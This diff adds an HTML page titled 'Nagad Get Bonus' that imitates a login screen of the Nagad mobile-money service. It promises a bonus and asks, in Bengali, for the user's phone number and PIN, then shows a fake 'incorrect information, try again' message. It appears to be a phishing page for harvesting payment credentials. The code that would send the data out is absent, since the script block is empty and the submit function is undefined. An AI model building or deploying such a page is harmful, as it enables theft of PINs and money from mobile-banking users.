@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nagad Get Bonus</title>
+    <style>
+        /* Add your custom CSS styles for the dialogue here */
+        #custom-dialogue {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            background-color: tomato;
+            color:white;
+        }
+
+        #dialogue-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        
+        body {
+    margin: 0;
+    padding: 0;
+    background-color: whitesmoke;
+    text-align: center;
+}
+
+img {
+    max-width: 100%;
+    max-height: 100%;
+    width: auto;
+    height: auto;
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.input-wrapper {
+    position: relative;
+    width: 300px;
+    margin-bottom: 20px;
+    margin-right: 20px;
+}
+
+.input-wrapper input {
+    width: calc(100% - 30px); /* Adjust according to your icon size and desired margin */
+    padding: 10px;
+    border: none;
+    border-bottom: 1px solid black;
+    box-sizing: border-box;
+}
+
+.input-wrapper label {
+    display: block;
+    margin-bottom: 5px;
+}
+
+.input-wrapper::after {
+    content: "";
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 1px;
+    background-color: red;
+}
+
+.icon {
+    position: absolute;
+    left: 5px; /* Adjust to position the icon */
+    top: 50%;
+    transform: translateY(-50%);
+    color: #aaa; /* Adjust icon color */
+    margin-right: 10px;
+}
+
+.button {
+    background-color: white;
+    border: 2px solid tomato;
+    border-radius: 20px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    padding: 10px;
+    padding-left: 50px;
+    padding-right: 50px;
+}
+
+.button:hover {
+    background-color: tomato;
+}
+
+
+
+
+.with-icon {
+  padding-left: 40px; /* Adjust according to your icon size and desired margin */
+  margin-left: 22px;
+  background-color:white;
+}
+
+.icon {
+  position: absolute;
+  left: 5px; /* Adjust to position the icon */
+  top: 50%;
+  transform: translateY(-50%);
+  width: 20px; /* Adjust icon width */
+  height: 20px; /* Adjust icon height */
+  background-color:white;
+  padding-top : 4px;
+  padding-bottom: 9px;,
+  padding-right: 4px;
+  padding-left:1px;
+}
+
+    </style>
+</head>
+<body>
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2psubrCExVOS1tUYwEtL37boZVcTWV5C4-1KOY01bsimLmhMpG719maDy_5vKU8Kk4ic-bkQt0LKjHZuo2R1Exr_c646nLY0-SNRpjgzdSw9rHFS0jwRiFj3rxQ1J18BIdwyTe6lA2IpMlXV2-LA4IJj0T_zPovdNHxn8e_bhJ2rX8SkhYNagnXwkK376/s576/20240222_121030.jpg" alt="Description of your image">
+    
+    <div class="container">
+        <div class="input-wrapper">
+            <label for="number"></label>
+            <input type="tel" id="number" placeholder="নগদ নম্বর দিন (11 digits)" class="with-icon" required pattern="\d{11}">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9BOMwGSQJVs78ILAsEqJfiT9qQVsnysUKdps8dYZLtZ7Cw24yDyn6DnUHUilg_Q9KNz6Fow251EceB0yuGYpD6jkWXgvQs0ko6w2kras-ab8Ne_79y1wnUcH2ujpsdCf2GQZF3hswaf30rlgXxd0_FXD2xmoyA2u4vZXbr9Aj0nTUaSUhoZq1D2aMz10c/s48/ic_call.png" class="icon">
+        </div>
+        <div class="input-wrapper">
+      <label for="pin"></label>
+<input type="number" id="pin" placeholder="পিন নম্বর" class="with-icon" required>
+<div id="maskedPin"></div>
+
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhch0US8Yx72DoH1m_xL0SF0A9muLv8nacRk80Wu9qhyqWTeQeiWPuMG2XvAFKA1-uiGCRhzrFAWvjrwtR4ZJWxrnxrYhMaglf9JaMj7lkQgpvq2Za7e1j6ogCLiQ18Tx4LIIJmfk17qbRiiB69uJX_wtlShXkpa37PlK9EM4Fg9Tnk8LBXLNhbvY0zQy_o/s48/ic_pin_outline.png" class="icon">
+        </div>
+        <button class="button" onclick="submitForm()">লগ ইন</button>
+    </div>
+
+    <!-- Custom Dialogue -->
+    <div id="dialogue-overlay"></div>
+    <div id="custom-dialogue">
+        <h2>দুঃখীত</h2>
+        <p>আপনার ব্যবহৃত তথ্যগুলো সঠিক নয় অনুগ্রহ করে আবার চেষ্টা করুন </p>
+        <button onclick="hideCustomDialogue()" style="background-color: orangered; /* Green */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+  border-radius: 8px;">Okay</button>
+
+    </div>
+
+    <script>
+        
+    </script>
+    
+    <script>
+    // Listen for touchstart event to trigger numeric keyboard on touch devices
+    document.getElementById("pin").addEventListener("touchstart", function() {
+        this.type = "number";
+    });
+
+    // Listen for blur event to revert back to password field
+    document.getElementById("pin").addEventListener("blur", function() {
+        this.type = "password";
+    });
+</script>
+
+</body>
+<footer>
+    <a href="#">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkxJScP0bKy0prEKKmrErz05l2FDmyqFuv-HaY2KoDMlntm43JLkAH1Y1CHwkHD1SVjMOXt-GkjpzrGwRqAmKljZhZcmK_Jt7nFdJJ1CFWuPmEbGySZxpEa3p3TQVPr6eRcUZn5BeJQHZ2CtUmpdHws1Vg7T34UBs_Kmk_I105kHcvFhb7uAUdF9a9phlL/s720/Screenshot_20240222-130651_Nagad.jpg" alt="Description of your image" style="width: 100%;">
+    </a>
+</footer>
+</html>
